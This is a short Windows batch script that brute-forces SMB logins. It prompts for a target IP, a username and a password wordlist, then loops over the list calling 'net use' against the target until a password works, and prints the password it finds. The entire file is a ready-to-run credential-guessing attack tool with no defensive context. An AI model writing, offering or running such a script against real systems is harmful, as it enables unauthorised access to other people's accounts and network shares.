@echo off
echo "created by anesboulef
color A
echo.
set /p ip="enter IP adress: "
set /p user="enter username:"
set /p wordlist="enter password lists:"

for /f %%a in (%wordlist%) do (
	echo %%a
	set pass=%%a
	call :attempt
)
echo Password not found :(
pause
exit

:success        
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass%
echo attempt: %pass%
if %errorlevel% EQU 0 goto success
